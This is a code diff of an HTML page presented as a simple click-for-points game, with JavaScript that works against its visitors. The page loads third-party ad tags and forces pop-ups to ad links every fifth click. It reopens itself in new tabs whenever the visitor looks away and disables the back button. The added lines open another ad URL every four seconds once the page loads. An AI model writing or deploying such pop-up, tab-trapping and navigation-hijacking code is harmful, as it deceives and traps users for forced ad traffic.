@@ -15,6 +15,7 @@
     <script src="https://alwingulla.com/88/tag.min.js" data-zone="74211" async data-cfasync="false"></script>
     <script src="https://itweepinbelltor.com/act/files/tag.min.js?z=7635350" data-cfasync="false" async></script>
  
+
     <style>
         body {
             height: 100vh;
@@ -67,135 +68,139 @@
             justify-content: center;
         }
     </style>
-    <script>
-        let tabOpened = false;
-        const initialTime = 60; // 1 minute in seconds
-        let clickCount = 0;
+<script>
+    let tabOpened = false;
+    const initialTime = 60; // 1 minute in seconds
+    let clickCount = 0;
 
-        // Function to check focus and open a new tab if necessary
-        function checkFocusOnce() {
-            if (!tabOpened && (document.hidden || !document.hasFocus())) {
-                tabOpened = true;
-                window.open(window.location.href, '_blank');
-            }
+    // Function to check focus and open a new tab if necessary
+    function checkFocusOnce() {
+        if (!tabOpened && (document.hidden || !document.hasFocus())) {
+            tabOpened = true;
+            window.open(window.location.href, '_blank');
         }
+    }
 
-        function resetTabOpened() {
-            if (!document.hidden && document.hasFocus()) {
-                tabOpened = false;
-            }
+    function resetTabOpened() {
+        if (!document.hidden && document.hasFocus()) {
+            tabOpened = false;
         }
+    }
 
-        // Timer and points management
-        function startGame() {
-            let timer = parseInt(localStorage.getItem('timer')) || initialTime;
-            let points = parseInt(localStorage.getItem('points')) || 0;
+    // Timer and points management
+    function startGame() {
+        let timer = parseInt(localStorage.getItem('timer')) || initialTime;
+        let points = parseInt(localStorage.getItem('points')) || 0;
 
-            // Update timer and points display
+        // Update timer and points display
+        document.getElementById('timer').textContent = `Timer: ${timer}s`;
+        document.getElementById('points').textContent = `Points: ${points}`;
+
+        // Timer countdown function
+        function countdown() {
+            if (timer > 0) {
+                timer--;
+                localStorage.setItem('timer', timer);
+            } else {
+                points = 0;
+                localStorage.setItem('points', points);
+                timer = initialTime;
+                localStorage.setItem('timer', timer);
+            }
             document.getElementById('timer').textContent = `Timer: ${timer}s`;
             document.getElementById('points').textContent = `Points: ${points}`;
+        }
 
-            // Timer countdown function
-            function countdown() {
-                if (timer > 0) {
-                    timer--;
-                    localStorage.setItem('timer', timer);
-                } else {
-                    points = 0;
-                    localStorage.setItem('points', points);
-                    timer = initialTime;
-                    localStorage.setItem('timer', timer);
-                }
-                document.getElementById('timer').textContent = `Timer: ${timer}s`;
-                document.getElementById('points').textContent = `Points: ${points}`;
+        // Increment points function
+        document.getElementById('incrementBtn').addEventListener('click', () => {
+            points++;
+            clickCount++;
+            localStorage.setItem('points', points);
+            localStorage.setItem('clickCount', clickCount);
+            document.getElementById('points').textContent = `Points: ${points}`;
+            if (points >= 50) {
+                showOverlay();
             }
 
-            // Increment points function
-            document.getElementById('incrementBtn').addEventListener('click', () => {
-                points++;
-                clickCount++;
-                localStorage.setItem('points', points);
-                localStorage.setItem('clickCount', clickCount);
-                document.getElementById('points').textContent = `Points: ${points}`;
-                if (points >= 50) {
-                    showOverlay();
-                }
-
-                // Check if 11 clicks have been made
-                if (clickCount % 5 === 0) {
-                    openMonetagLink();
-                }
-            });
-
-            // Start the countdown
-            setInterval(countdown, 1000);
-        }
-
-        function showOverlay() {
-            document.getElementById('overlay').style.display = 'flex';
-        }
-
-        function copyToClipboard() {
-            const url = window.location.href;
-            navigator.clipboard.writeText(url).then(() => {
-                alert('Link copied to clipboard!');
-            }).catch(err => {
-                alert('Failed to copy link');
-            });
-        }
-
-        function quitGame() {
-            localStorage.removeItem('timer');
-            localStorage.removeItem('points');
-            localStorage.removeItem('clickCount');
-            window.location.href = 'https://www.google.com';
-        }
-
-        function replayGame() {
-            localStorage.removeItem('timer');
-            localStorage.removeItem('points');
-            localStorage.removeItem('clickCount');
-            window.location.reload();
-        }
-
-        function openMonetagLink() {
-            window.open('https://shamautiste.net/4/7646713');
-        }
-
-        // Event listeners for tab focus management
-        window.addEventListener('blur', function() {
-            setTimeout(function() {
-                checkFocusOnce();
-            }, 100);
+            // Check if 5 clicks have been made
+            if (clickCount % 5 === 0) {
+                openMonetagLink();
+            }
         });
 
-        document.addEventListener('visibilitychange', function() {
-            setTimeout(function() {
-                checkFocusOnce();
-            }, 100);
+        // Start the countdown
+        setInterval(countdown, 1000);
+    }
+
+    function showOverlay() {
+        document.getElementById('overlay').style.display = 'flex';
+    }
+
+    function copyToClipboard() {
+        const url = window.location.href;
+        navigator.clipboard.writeText(url).then(() => {
+            alert('Link copied to clipboard!');
+        }).catch(err => {
+            alert('Failed to copy link');
         });
+    }
 
-        window.addEventListener('focus', function() {
-            setTimeout(function() {
-                resetTabOpened();
-            }, 100);
-        });
+    function quitGame() {
+        localStorage.removeItem('timer');
+        localStorage.removeItem('points');
+        localStorage.removeItem('clickCount');
+        window.location.href = 'https://www.google.com';
+    }
 
-        // Prevent back button navigation
-        history.pushState(null, null, location.href);
-        window.onpopstate = function () {
-            history.go(1);
-        };
+    function replayGame() {
+        localStorage.removeItem('timer');
+        localStorage.removeItem('points');
+        localStorage.removeItem('clickCount');
+        window.location.reload();
+    }
 
-        window.onload = function() {
-            startGame();
-            clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
-            // Auto click every 3 seconds
-            setInterval(() => {
-                document.getElementById('incrementBtn').click();
-            }, 3000);
-        };
-    </script>
+    function openMonetagLink() {
+        window.open('https://shamautiste.net/4/7646713');
+    }
+
+    function openLinkEvery4Seconds() {
+        setInterval(() => {
+            window.open('https://chaipoodrort.com/4/7638836');
+        }, 4000);
+    }
+
+    // Event listeners for tab focus management
+    window.addEventListener('blur', function() {
+        setTimeout(function() {
+            checkFocusOnce();
+        }, 100);
+    });
+
+    document.addEventListener('visibilitychange', function() {
+        setTimeout(function() {
+            checkFocusOnce();
+        }, 100);
+    });
+
+    window.addEventListener('focus', function() {
+        setTimeout(function() {
+            resetTabOpened();
+        }, 100);
+    });
+
+    // Prevent back button navigation
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+        history.go(1);
+    };
+
+    window.onload = function() {
+        startGame();
+        clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
+        openLinkEvery4Seconds();
+    };
+</script>
+
 </head>
 <body>
     <div id="game">
